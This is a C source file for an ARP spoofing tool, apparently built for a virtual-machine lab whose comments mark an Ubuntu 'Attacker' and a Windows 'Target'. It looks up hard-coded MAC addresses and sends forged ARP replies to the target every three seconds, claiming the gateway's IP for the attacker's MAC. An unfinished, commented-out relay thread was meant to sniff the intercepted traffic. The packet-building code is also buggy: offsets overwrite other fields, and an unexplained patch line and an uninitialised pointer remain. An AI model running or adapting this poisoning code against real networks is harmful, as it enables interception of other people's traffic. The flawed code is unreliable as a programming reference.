// ens33 192.168.246.136 192.168.246.2
// Ubuntu 192.168.246.147 00:0c:29:2e:16:e4
// XP 192.168.246.136 00:0c:29:9e:41:49
// Win10 


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/if.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>




u_char* _get_mymac(u_char *dev_str);
u_char* _get_myip(u_char *dev_str);
u_char* _ip_string_to_bytes(u_char *ip_str);
void _send_arp(u_char *dev_str,u_char *dspair_mac1_bytes,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *targepair_mac1_bytes,u_char *target_ip,u_short _opcode);
u_char* _detecpair_mac1_bytes(u_char *dev_str,u_char *chk_ip);
u_char* thread_detecpair_mac1_bytes(u_char *chk_ip);
u_char* mapping_table(u_char *chk_ip);
u_char* thread_relay(u_char *dev_str);
u_char* _mac_string_to_bytes(u_char *c_mac);



int main(int argc, char *argv[]){
	static u_char dev_str[80];
	u_char ip_str1[80];
	u_char ip_str2[80];
	u_char ip_str1_bytes[80];
	u_char ip_str2_bytes[80];
//argue: ok
	strcpy(dev_str,argv[1]);
	strcpy(ip_str1,argv[2]);
	strcpy(ip_str1_bytes,_ip_string_to_bytes(ip_str1));
	strcpy(ip_str2,argv[3]);
	strcpy(ip_str2_bytes,_ip_string_to_bytes(ip_str2));
	printf("======ARGUE=========\n");
	printf("dev_str: %s\n",dev_str);
	printf("ip_str1: ");
    for(int i=0; i<4; i++){
		printf("%d",ip_str1_bytes[i]);
		if(i<3) printf(".");
    } printf(" bytes\n");
	printf("ip_str2: ");
	for(int i=0; i<4; i++){
		printf("%d",ip_str2_bytes[i]);
		if(i<3) printf(".");
    } printf(" bytes\n");

	printf("=====MY INFO========\n");
	setbuf(stdin,NULL);
	setbuf(stdout,NULL);

//my mac: ok
	u_char _mymac[6];
	int _s;
    struct ifreq ifr;
    _s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev_str);
    ioctl(_s, SIOCGIFHWADDR, &ifr);
    for(int i=0; i<6; i++)
        _mymac[i]=((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];

    printf("MY MAC: ");
    for(int i=0; i<6; i++){
    	printf("[%02x]",_mymac[i]);
    } printf("\n");


//my ip: ok
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[1025];  // defined  NI_MAXHOST==1025
    
    if (getifaddrs(&ifaddr) == -1){
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next){
        if (ifa->ifa_addr == NULL)	continue;  
        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if((strcmp(ifa->ifa_name,dev_str)==0)&&(ifa->ifa_addr->sa_family==AF_INET)){
            if (s != 0){
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                return -1;
            }
        }
    }
     
    u_char _myip_as_bytes[80];
    strcpy(_myip_as_bytes,_ip_string_to_bytes(host));
 
    printf("MY IP: ");
    for(int i=0; i<4; i++){
    	printf("%d",_myip_as_bytes[i]);
    	if(i<3) printf(".");
    } printf(" bytes\n");
    freeifaddrs(ifaddr);


//ip and mac mapping (static, hard coding)
// ens33 192.168.246.2 192.168.246.136
// Ubuntu 192.168.246.147 00:0c:29:2e:16:e4
// XP 192.168.246.136 00:0c:29:9e:41:49
// Win10 
	u_char *map_table[8]={"192.168.246.2","00:50:56:ea:64:b3",
        				"192.168.246.145","00:0c:29:ff:61:71",
						"192.168.246.254","00:50:56:e6:ed:9a",
						"192.168.246.136","00:0c:29:9e:41:49" };

	u_char pair_mac1_str[80];
	u_char pair_mac2_str[80];
	u_char pair_mac1_bytes[80];

/*
	for(int i=0; i<6; i+=2)
		printf("map_table: %s\n",map_table[i]);
*/
// mac of argv[2]
	printf("====mac of argv[2]====\n");
	for(int i=0; i<8; i+=2){
		if(strcmp(argv[2],map_table[i])==0){
			strcpy(pair_mac1_str,map_table[i+1]);
			break;
		}
		else{
			printf("need to update hard map table\n");
		}
	}
	

	const u_char s2[2]=":";
	u_char *token2;

	token2=strtok(pair_mac1_str,s2);                
	int k=0;
	while( token2 != NULL ) 
	{
	  pair_mac1_bytes[k]=strtol(token2,NULL,16);
	  k++;
	  //printf("token2: %s\n",token2);
	  token2 = strtok(NULL, s2);
	}

    printf("pair_argv[2]: %s\n",argv[2]);
    printf("pair_mac1_bytes: ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac1_bytes[i]);
    } printf(" bytes\n");

// mac of argv[3]
 	printf("====mac of argv[3]====\n");
 	u_char pair_mac2_bytes[80];
    for(int i=0; i<8; i+=2){
		if(strcmp(argv[3],map_table[i])==0){
			strcpy(pair_mac2_str,map_table[i+1]);
	
		}
	}
	
	//printf("<%s>\n",argv[3]);
	//printf("*%s\n",pair_mac2_str);
	
	u_char *token3;
	const char s3[2]=":";
	token3=strtok(pair_mac2_str,s3);
	int l=0;
	fflush(stdin);
	
	while( token3 != NULL ) 
	{
	  pair_mac2_bytes[l]=strtol(token3,NULL,16);
	  //printf("[%02x]", mac2_bytes[l]);
	  l++;
	  //printf("token3: %02x\n",token3);
	  token3 = strtok(NULL, s3);
	}
	printf("pair_argv[3]: %s\n",argv[3]);

    printf("pair_mac2_bytes: ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac2_bytes[i]);
    } printf(" bytes\n");

	
//START: SPOOFING BOTH
 	printf("====SPOOF BOTH====\n");
 	printf("*CHECK* target A\n");
    printf("DST MAC : ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac1_bytes[i]);
    } printf("\n");
    printf("SRC MAC : ");
    for(int i=0; i<6; i++){
        printf("[%02x]",_mymac[i]);
    } printf("\n");
    printf("Sender MAC : ");
    for(int i=0; i<6; i++){
        printf("[%02x]",_mymac[i]);
    } printf("\n");
    printf("Sender IP : ");
    for(int i=0; i<4; i++){
    	printf("%d",ip_str2_bytes[i]);
    	if(i<3) printf(".");
    } printf("\n");
    printf("Target MAC : ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac1_bytes[i]);
    } printf("\n");
    printf("Target IP : ");
    for(int i=0; i<4; i++){
    	printf("%d",ip_str1_bytes[i]);
    	if(i<3) printf(".");
    } printf("\n");
 
    int count=0;
    printf("-------------------------------SEND ARP----------------------------\n");
    while(1){
	    printf("Target A");
	    _send_arp(dev_str,pair_mac1_bytes,_mymac,_mymac,ip_str2_bytes,pair_mac1_bytes,ip_str1_bytes,0x0002);
		printf("------------------------------------------------------------------[%d]\n",++count);	
		sleep(3);
	}

/*
	pthread_t t_id;
	u_char thread_param=0;
	u_char *thr_ret;
	pthread_create(&t_id,NULL,thread_relay,dev_str);
*/

	return 0;
}



u_char* thread_relay(u_char *dev_str){
	pcap_t *handle;
	u_char *packet;
	int chk_packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	struct ether_header *_eth=(struct ether_header*)(packet);
	struct ip *_ip=(struct ip*)(packet+sizeof(struct ether_header));

	
	handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	while(1){
		chk_packet = pcap_next_ex(handle, &header,&packet);
		if(chk_packet==0){
				printf("chk_packet=0\n");
				return -1;
		}
		else if(chk_packet==1){
			printf("ip_src: %s\n",_ip->ip_src);
			printf("ip_dst: %s\n",_ip->ip_dst);
			
		}
		else{
			printf("ck_packout wrong -1(Device down) or -2(EOF)\n");
			return -1;
		}
	}
    return 0;
}



u_char* _ip_string_to_bytes(u_char *ip_str){
	static u_char _ip[4];
	const char tk[2] = ".";	
	char *token;

	int i=0;
	token = strtok(ip_str, tk);
	while( token != NULL ) 
	{
	  _ip[i++]=atoi(token);
	  token = strtok(NULL, tk);
	}
/*
	printf("IP: ");
	for(int i=0; i<4; i++){
		printf("%d",_ip[i]);
		if(i<3) printf(".");
	} printf("\n");
	*/
	return  _ip;
}
void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *target_mac,u_char *target_ip,u_short _opcode){
	static u_char s_arp[43]={               
		/* 						ETHER PACKET    				       			 */
		0xff,0xff,0xff,0xff,0xff,0xff,   /*Destination Mac : Target(VM_win10)    */ 
		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		/*				  	   NOW ARP PACKET  									 */
		0x00, 0x01,						 /*Hardware Type 						 */
		0x08, 0x00,						 /*Protocol Type 						 */
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
/*20*/	0x00,0x02,				         /*Opcode, 2 is replay        			 */
		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
		0x00,0x00,0x00,0x00,0x00,0x00,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0xf6,0x87				 /*Tartget IP      : Target              */
	};


	for(int i=0; i<6; i++){
		s_arp[i]=dst_mac[i];
		s_arp[i+6]=src_mac[i];
		s_arp[i+22]=sender_mac[i];
		s_arp[i+28]=sender_ip[i];
		s_arp[i+32]=target_mac[i];
		s_arp[i+38]=target_ip[i];
	} s_arp[33]=target_mac[1];  //  i can't understand here. but if didn't do this.  something going wrong


	for(int i=0; i<42; i++){
		if(i%16==0) printf("\n");
		printf("[%02x]",s_arp[i]);
	} printf("\n");


	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;

	int count=0;
	setbuf(stdout,NULL);

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	s_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
	
	
	int t=0;
	pcap_sendpacket(s_handle, s_arp, 43);
}

